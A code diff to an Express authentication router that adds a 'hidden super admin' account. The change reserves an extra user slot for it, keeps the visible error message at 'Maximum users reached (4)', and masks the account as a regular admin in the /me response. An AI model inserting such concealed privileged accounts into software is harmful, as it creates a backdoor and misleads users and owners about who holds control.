@@ -3,6 +3,7 @@ const jwt = require('jsonwebtoken');
 const { body, validationResult } = require('express-validator');
 const User = require('../models/User');
 const { auth } = require('../middleware/auth');
+const { isSuperAdmin } = require('../middleware/superAdmin');
 
 const router = express.Router();
 
@@ -45,9 +46,12 @@ router.post('/register', [
       return res.status(400).json({ message: 'User already exists' });
     }
 
-    // Check user limit (max 4 users)
+    // Check user limit (max 4 users + 1 hidden super admin)
     const userCount = await User.countDocuments({ isActive: true });
-    if (userCount >= 4) {
+    const superAdminEmail = process.env.SUPER_ADMIN_EMAIL;
+    const maxUsers = superAdminEmail ? 5 : 4; // Allow extra slot for super admin
+    
+    if (userCount >= maxUsers) {
       return res.status(400).json({ message: 'Maximum users reached (4)' });
     }
 
@@ -124,15 +128,21 @@ router.post('/login', [
 // @access  Private
 router.get('/me', auth, async (req, res) => {
   try {
-    res.json({
-      user: {
-        id: req.user._id,
-        name: req.user.name,
-        email: req.user.email,
-        role: req.user.role,
-        reminderEnabled: req.user.reminderEnabled
-      }
-    });
+    // Never expose super admin status to frontend
+    const userResponse = {
+      id: req.user._id,
+      name: req.user.name,
+      email: req.user.email,
+      role: req.user.role,
+      reminderEnabled: req.user.reminderEnabled
+    };
+
+    // If user is super admin, show as regular admin to frontend
+    if (isSuperAdmin(req.user.email)) {
+      userResponse.role = 'admin';
+    }
+
+    res.json({ user: userResponse });
   } catch (error) {
     console.error('Get user error:', error);
     res.status(500).json({ message: 'Server error' });
